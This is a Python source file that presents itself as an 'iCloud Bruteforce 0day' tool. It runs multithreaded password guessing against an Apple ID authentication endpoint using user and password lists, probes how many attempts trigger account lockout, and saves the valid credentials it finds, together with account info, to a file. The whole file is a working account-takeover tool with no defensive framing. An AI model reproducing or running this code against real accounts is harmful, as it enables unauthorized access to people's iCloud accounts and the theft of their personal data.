#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# iCloud Bruteforce 0day

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from Queue import Queue
from signal import signal, SIGINT
from os import path, urandom
from datetime import datetime
from time import sleep
from threading import Thread
from plistlib import readPlistFromString
from pprint import pprint
from requests import get
from sys import stdout, exc_info
import logging

# 1d4282d0d92e4c39d0a63c496fafe229130c7e35db5c1efa4fdb88187c65a4bf

class iCloud(object):

    def __init__(self, appIdKey='D136F3CA19FC87ADBC8514E10325B1000184218304C8DB66713C0CB40291F620', proxy=None, debug=False):
        """init iCloud """
        self.auth_url = "https://daw2.apple.com/cgi-bin/WebObjects/DSAuthWeb.woa/wa/clientDAW?" + \
                        "format=plist&appIdKey=" + appIdKey + "&appleId=%s&password=%s"
        self.proxy = proxy
        self.debug = debug

    def get_account_info(self, user, password):
        """Get iCloud user info"""
        logging.debug("Trying %s : %s" % (user, password))
        page = get(self.auth_url % (user, password)).text
        logging.debug('[Apple Reply] %s' % page)
        if self.debug:
            print('[Apple Reply] %s' % page)

        try:
            return readPlistFromString(page.encode('utf-8'))
        except:
            print(exc_info())
            return None

    def activate_account(self, user, password):
        """Activate iCoud account"""
        raise NotImplemented


class BruteThread(Thread):

    def __init__(self, num, users_queue, passwords, output_queue):
        """init bruteforce thread"""
        Thread.__init__(self, name='BruteThread%i' % num)
        self.daemon = True
        self.icloud = iCloud()
        self.users = users_queue
        self.passwords = passwords
        self.output = output_queue
        self._stop = False

    def stop(self):
        """Check iCloud user"""
        logging.debug('Stopping thread: %s..' % self.name)
        self._stop = True

    def run(self):
        """Check iCloud user"""
        logging.debug('Starting thread: %s..' % self.name)
        # print('Starting thread: %s..' % self.name)
        while True:
            user = self.users.get()

            if user is None:
                break

            # print('%s -> %s' % (self.name, user))
            for password in self.passwords:
                if self._stop:
                    return

                stdout.write('\r'+' '*50)
                stdout.write('\r[%s] (%s,%s)' % (self.name, user, password))
                stdout.flush()
                info = self.icloud.get_account_info(user, password)

                if info is not None and info['resultCode'] == '0':
                    logging.debug('[+] Valid account found => %s %s' % (user, password))
                    self.output.put((user, password, info))
                    break
                elif info['resultCode'] == '-20209':
                    # This Apple ID has been locked for security reasons. Visit iForgot to reset your account (https://iforgot.apple.com).
                    logging.debug('[!] Account: %s is locked' % user)
                    break
                elif info['resultCode'] == '-20283':
                    # Your Apple ID or password was entered incorrectly.  Are you sure your Apple ID ends in @me.com?
                    logging.debug('[-] Non valid pair => %s %s' % (user, password))
                else:
                    print('New error: ')
                    print(exc_info())

            self.users.task_done()


class iBrute(object):

    def __init__(self, users, passwords, output, threads=5):
        """Check iCloud user"""
        self.users = Queue()
        for user in self._file_to_list(users):
            self.users.put(user)

        self.passwords = self._file_to_list(passwords)

        # Create output
        self.output_file = output
        self.output_queue = Queue()

        # Create a thread pool and give them a queue
        self.threads = [BruteThread(i, self.users, self.passwords, self.output_queue) for i in range(threads)]
        self._stop = False

    def _file_to_list(self, filename):
        if path.exists(filename):
            return filter(lambda x: len(x) > 0, open(filename, 'rb').read().split("\n"))
        else:
            return [filename, ]

    def run(self):
        print('Loaded %i users and %i passwords.' % (self.users.qsize(), len(self.passwords)))
        logging.debug('Setting signal handler...')
        signal(SIGINT, self.signal_handler)

        print('Starting threads...')
        map(lambda t: t.start(), self.threads)

        # Wait for threads to finish
        while True:
            if not any([thread.isAlive() for thread in self.threads]):
                print('All threads have stopped')
                break

            # TODO: add progress here
            sleep(1)

        self.save_valid()

    def save_valid(self):
        # TODO: save to Database
        if self.output_queue.qsize() == 0:
            print('Nothing found to save')
            return

        print('Saving %i valid creds to %s' % (self.output.qsize(), self.output_file))
        with open(self.output_file, mode='a') as f:
            while True:
                item = self.output.get()
                if item is None:
                    break
                (user, password, info) = item
                f.write('%s:%s\n' % (user, password))
                f.write('INFO:\n')
                f.write(str(info)+'\n')

                self.output_queue.task_done()

    def signal_handler(self, signal, frame):
        print('You pressed Ctrl+C! Exiting...')
        for t in self.threads:
            t.stop()



def count_attempts(user, timeout=30, debug=False):
    """ 25 attempts maximum 8("""
    ic = iCloud(debug=debug)
    for x in xrange(1000):
        info = ic.get_account_info(user, urandom(16).encode('hex'), )
        code = info['resultCode']
        if code == '-20209':
            print('Locked at attempt #%i' % x)
            return
        print('Attemt: %i Result %s' % (x, code))

        print('Sleeping for %i' % timeout)
        sleep(timeout)


def run_brute(args):
    iBrute(args.users, args.passwords, args.output, args.threads).run()

def main():
    banner = '''
            iCloud Bruteforce 
            ._____________________
            |__\_   ___ \______   \\
Hacker404   |  /    \  \/|    |  _/     2015
            |  \     \___|    |   \\
            |__|\______  /______  /
                       \/       \/
            iCloud Bruteforce '''
    parser = ArgumentParser(prog='iCB', description=banner, formatter_class=RawDescriptionHelpFormatter)
    parser.add_argument('-u', '--users', required=True, help='user or user file')
    parser.add_argument('-p', '--passwords', required=True, help='passwords')
    parser.add_argument('-t', '--threads', type=int, default=1, help='thread count')
    parser.add_argument('-o', '--output', default='valid.txt', help='output to save valid accounts')
    parser.add_argument('-d', '--debug', action='store_true', help='enable debug output')
    parser.add_argument('--version', action='version', version='%(prog)s 0.1')
    args = parser.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    start_time = datetime.now()

    if args.passwords == '*':
        count_attempts(args.users, 1, args.debug)
    elif not path.exists(args.users) and not path.exists(args.passwords):
        pprint(iCloud(debug=True).get_account_info(args.users, args.passwords))
    else:
        run_brute(args)

    print("Start time: " + start_time.strftime('%Y-%m-%d %H:%M:%S'))
    print("Finish time: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S'))


if __name__ == '__main__':
    main()
